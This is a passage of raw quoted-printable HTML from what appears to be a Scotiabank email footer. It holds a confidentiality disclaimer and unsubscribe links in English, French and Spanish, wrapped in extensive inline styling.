+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>
+This email may contain confidential information the use of which by an unin=
+tended recipient is unauthorized. This email may also contain important dis=
+closure information for the records of the intended recipient(s). For detai=
+ls please click here:&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'><SPAN>&nbsp;</SPAN></SPAN>
+ <A style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "Se=
+goe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont,=
+ Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: b=
+aseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: black; PADDING-BOTTOM: 0px; FONT-S=
+TYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHAN=
+S: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-e=
+ast-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px' hr=
+ef=3D"http://www.scotiabank.com/email_disclaimer/email_english.html" rel=3D=
+"noopener noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<SPAN style=3D'BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Li=
+ght", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -=
+webkit-font-smoothing: antialiased'>http://www.scotiabank.com/email_disclai=
+mer/email_english.html</SPAN><WBR style=3D"-webkit-font-smoothing: antialia=
+sed"><WBR style=3D"-webkit-font-smoothing: antialiased">
+ </A>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>Pour vous d?sab=
+onner et cesser de recevoir des messages ?lectroniques commerciaux de La Ba=
+nque de Nouvelle-?cosse, veuillez cliquer ici :&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'><SPAN>&nbsp;</SPAN></SPAN>
+ <A style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "Se=
+goe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont,=
+ Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: b=
+aseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: black; PADDING-BOTTOM: 0px; FONT-S=
+TYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHAN=
+S: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-e=
+ast-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px' hr=
+ef=3D"https://desabonnement.banquescotia.com/?entid=3DBNS&amp;buid=3DSBNK" =
+rel=3D"noopener noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<SPAN style=3D'BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Li=
+ght", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -=
+webkit-font-smoothing: antialiased'>https://desabonnement.banquescotia.com?=
+entid=3DBNS&amp;buid=3DSBNK</SPAN><WBR style=3D"-webkit-font-smoothing: ant=
+ialiased">
+ <WBR style=3D"-webkit-font-smoothing: antialiased"></A>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>Pour vous d?sab=
+onner et cesser de recevoir des messages ?lectroniques commerciaux de certa=
+ins autres exp?diteurs figurant dans la liste ci-jointe, veuillez cliquer i=
+ci :&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'><SPAN>&nbsp;</SPAN></SPAN>
+ <A style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "Se=
+goe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont,=
+ Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: b=
+aseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: black; PADDING-BOTTOM: 0px; FONT-S=
+TYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHAN=
+S: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-e=
+ast-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px' hr=
+ef=3D"https://www.unsubscribe.gwm.scotiabank.com/?page=3Dgwm&amp;lang=3Dfr"=
+ rel=3D"noopener noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<SPAN style=3D'BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Li=
+ght", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -=
+webkit-font-smoothing: antialiased'>https://www.unsubscribe.gwm.scotiabank.=
+com?page=3Dgwm&amp;lang=3Dfr</SPAN><WBR style=3D"-webkit-font-smoothing: an=
+tialiased">
+ <WBR style=3D"-webkit-font-smoothing: antialiased"></A>
+<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (Wes=
+t European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helve=
+tica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
+ORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE:=
+ normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING:=
+ normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant=
+-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>&nbsp;</SPAN>
+ <BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West=
+ European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvet=
+ica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFO=
+RM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS:=
+ 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); =
+TEXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>
+Cette transmission peut contenir de l'information confidentielle et son uti=
+lisation par toute personne autre que la personne ? laquelle cette transmis=
+sion est destin?e est interdite. Le pr?sent courriel peut aussi contenir de=
+s renseignements importants pour les dossiers du ou des destinataires pr?vu=
+s. Pour plus de d?tails, veuillez vous diriger vers:&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'><SPAN>&nbsp;</SPAN></SPAN>
+ <A style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "Se=
+goe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont,=
+ Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: b=
+aseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: black; PADDING-BOTTOM: 0px; FONT-S=
+TYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHAN=
+S: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-e=
+ast-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px' hr=
+ef=3D"http://www.scotiabank.com/email_disclaimer/email_francais.html" rel=
+=3D"noopener noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<SPAN style=3D'BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Li=
+ght", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -=
+webkit-font-smoothing: antialiased'>http://www.scotiabank.com/email_disclai=
+mer/email_francais.html</SPAN><WBR style=3D"-webkit-font-smoothing: antiali=
+ased">
+ <WBR style=3D"-webkit-font-smoothing: antialiased"></A>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>Para dejar de r=
+ecibir mensajes electr?nicos comerciales de The Bank of Nova Scotia en Cana=
+d?, haga clic aqu?:&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'><SPAN>&nbsp;</SPAN></SPAN>
+ <A style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "Se=
